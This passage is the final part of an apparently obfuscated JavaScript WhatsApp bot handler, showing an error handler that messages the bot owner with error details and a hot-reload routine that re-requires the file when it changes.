              return _0x2f6673.reply(_0x4c2b4a);
            }
          });
        }
    }
  } catch (_0x46364f) {
    console.log(util.format(_0x46364f));
    let _0x3f9e8e = global.owner;
    _0x47285b.sendMessage(_0x3f9e8e + "@s.whatsapp.net", {
      'text': "*Hallo developer, telah terjadi error pada command :* " + (isCmd ? prefix + command : _0x2f6673.text) + "\n\n*Detail informasi error :*\n" + util.format(_0x46364f),
      'contextInfo': {
        'isForwarded': true
      }
    }, {
      'quoted': _0x2f6673
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});